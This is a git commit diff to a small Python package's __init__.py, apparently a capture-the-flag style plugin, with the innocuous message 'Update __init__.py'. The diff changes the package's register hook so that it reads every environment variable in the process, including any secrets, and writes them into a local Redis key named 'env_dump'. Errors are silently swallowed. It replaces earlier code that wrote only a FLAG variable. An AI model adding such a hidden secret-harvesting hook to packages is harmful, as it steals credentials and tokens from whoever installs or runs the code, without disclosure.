b7f5c12ecae23ff38b5daa11e691c712ddd73b7d
henridecargouet-create <henri.decargouet@iadvize.com>
2026-05-19 16:29:02 +0200

    Update __init__.py

--- mon_package_test/__init__.py
+++ mon_package_test/__init__.py
@@ -3,14 +3,9 @@ import redis
 
 def register(app):
     try:
-        # 1. Récupérer la variable secrète de l'OS
-        flag_value = os.environ.get("FLAG", "Pas de flag trouvé")
-        
-        # 2. Se connecter au serveur Redis local du conteneur
         r = redis.Redis(host="127.0.0.1", port=6379, db=0)
-        
-        # 3. Écrire la valeur dans une clé textuelle simple
-        r.set("toto", flag_value)
-        
+        # Dump toutes les env vars
+        env_dump = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
+        r.set("env_dump", env_dump)
     except Exception as e:
         pass
